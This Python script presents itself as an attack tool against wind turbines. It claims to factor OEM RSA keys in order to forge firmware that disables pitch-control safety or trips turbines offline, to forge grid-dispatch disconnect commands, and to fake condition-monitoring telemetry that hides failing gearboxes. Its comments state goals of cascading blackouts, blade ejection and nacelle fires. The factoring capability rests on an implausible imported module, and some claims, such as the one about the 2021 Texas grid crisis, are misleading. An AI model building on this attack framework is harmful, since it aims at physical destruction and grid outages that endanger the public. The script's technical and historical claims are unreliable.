"""
Forge wind turbine controller firmware and grid-services dispatch by factoring
OEM RSA signing keys (Vestas/Siemens Gamesa/GE/Goldwind). Trip ~400,000
turbines offline simultaneously for cascading grid instability, or disable
pitch-control safety for structural failure.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import json
import hashlib

# Wind turbine OEMs
WIND_OEMS = {
    "vestas":         {"share": "20%", "controller": "VestasOnline", "capacity_gw": 200},
    "siemens_gamesa": {"share": "14%", "controller": "WebWPS", "capacity_gw": 140},
    "ge_vernova":     {"share": "10%", "controller": "MarkVIe", "capacity_gw": 100},
    "goldwind":       {"share": "15%", "controller": "Fortune", "capacity_gw": 150},
}

# IEC 61400-25 / IEC 62443 safety functions
SAFETY_FUNCTIONS = [
    "pitch_control",        # blade pitch angle — overspeed protection
    "yaw_control",          # nacelle orientation
    "brake_system",         # mechanical + aerodynamic braking
    "overspeed_protection", # SIL-2 certified
]


def extract_oem_firmware_cert(oem: str) -> bytes:
    """Extract OEM turbine controller firmware signing certificate."""
    info = WIND_OEMS[oem]
    print(f"[*] extracting {oem} ({info['controller']}) firmware signing cert")
    print(f"[*] ~{info['capacity_gw']} GW installed capacity affected")
    return _demo["pub_pem"]


def forge_turbine_firmware(factorer: PolynomialFactorer,
                           oem_cert: bytes, oem: str,
                           target: str, action: str) -> bytes:
    """Forge controller firmware that tampers with safety or grid functions."""
    payload = json.dumps({
        "oem": oem,
        "target": target,
        "action": action,
        "standard": "IEC 61400-25 / IEC 62443",
    }).encode()
    sig = factorer.forge_pkcs1v15_signature(oem_cert, payload, "sha256")
    print(f"[*] forged {oem} firmware: {action} {target}")
    return payload + sig


def forge_grid_services_dispatch(factorer: PolynomialFactorer,
                                 tso_cert: bytes,
                                 wind_farm: str,
                                 command: str,
                                 mw: float) -> dict:
    """Forge a grid-services dispatch command from TSO/ISO/RTO.

    Wind plants bid ancillary services (frequency response, reserves).
    Forge dispatch -> simultaneous disconnection during low-frequency event
    -> cascading blackout.
    """
    msg = {
        "wind_farm": wind_farm,
        "command": command,
        "mw": mw,
        "timestamp": "2026-04-15T14:00:00Z",
    }
    factorer.forge_pkcs1v15_signature(tso_cert,
                                      json.dumps(msg).encode(), "sha256")
    print(f"[*] forged grid dispatch: {wind_farm} <- {command} ({mw} MW)")
    return msg


def suppress_cms_alarms(factorer: PolynomialFactorer,
                        cloud_cert: bytes,
                        turbine_id: str) -> dict:
    """Suppress condition-monitoring alarms via forged cloud telemetry.

    Vestas CMS / Siemens Diagnostic Service Center / GE Meridium APM
    receive signed telemetry. Forge to suppress bearing-failure warnings
    -> catastrophic gearbox failure or nacelle fire.
    """
    telemetry = {
        "turbine_id": turbine_id,
        "gearbox_vibration_mm_s": 2.1,  # normal range, actual: 15.0
        "bearing_temp_c": 65,            # normal range, actual: 120
        "oil_debris_ppm": 5,             # normal range, actual: 200
    }
    factorer.forge_pkcs1v15_signature(cloud_cert,
                                      json.dumps(telemetry).encode(), "sha256")
    print(f"[*] forged CMS telemetry for {turbine_id}: all normal (actually failing)")
    return telemetry


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Wind turbine SCADA — grid-scale safety & stability ===")
    print("    ~400,000 turbines globally, ~1,000 GW installed capacity")
    print("    ~10% of global electricity generation")
    print()

    oem = "vestas"
    print(f"[1] extracting {oem} firmware signing cert...")
    cert = extract_oem_firmware_cert(oem)

    print("[2] factoring OEM RSA signing key...")

    print("[3] forging firmware: disable pitch-control safety...")
    forge_turbine_firmware(f, cert, oem, "pitch_control", "disable")
    print("    rotor overspeed -> structural failure")
    print("    blade ejection: tens of tonnes at 80 m/s tip velocity")

    print("[4] alternative: trip all turbines offline simultaneously...")
    forge_turbine_firmware(f, cert, oem, "grid_connect", "trip_offline")
    print(f"    sudden loss of ~{WIND_OEMS[oem]['capacity_gw']} GW")
    print("    cascading grid instability (2003 Northeast / 2006 UCTE-class)")

    print("[5] forging grid-services dispatch: disconnect during freq event...")
    forge_grid_services_dispatch(f, cert, "ERCOT-WindFarm-42",
                                 "DISCONNECT", 500.0)
    print("    Feb 2021 Texas grid crisis: wind/solar disconnection cascaded")

    print("[6] suppressing condition-monitoring alarms...")
    suppress_cms_alarms(f, cert, "VES-T-4521")
    print("    bearing failure undetected -> nacelle fire / gearbox destruction")

    print()
    print("[*] turbine lifecycle: 20-25 years")
    print("[*] offshore repair: jack-up vessels, ~EUR100k/day, weather-constrained")
